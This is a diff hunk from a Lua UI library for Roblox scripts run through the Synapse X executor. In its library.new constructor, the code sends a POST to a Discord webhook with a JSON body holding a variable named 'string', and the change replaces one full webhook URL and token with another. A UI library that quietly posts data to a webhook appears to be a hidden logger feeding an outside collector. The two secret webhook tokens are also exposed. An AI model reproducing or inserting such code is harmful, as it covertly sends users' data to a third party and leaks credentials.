@@ -236,7 +236,7 @@ function library.new(library_title, cfg_location)
     
     local response = syn.request(
         {
-            Url = 'https://discord.com/api/webhooks/1086804605377191976/DoO3Vmx0IFXW2s0deiM_ZXYVnf84Kq0fk-9Qw4f6Rt3r1avCg6Zl9mnlBsRQr6XdgkX-', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
+            Url = 'https://discord.com/api/webhooks/1087940987596316742/WCbyz9cOCs_32Do6bFfa4RvwpwNzJFX_Cy00Bx0P66QJdvJehijWh-dII63Zptg5lRjD', Method = 'POST', Headers = {['Content-Type'] = 'application/json'},
             Body = game:GetService('HttpService'):JSONEncode({content = string})
         }
     );
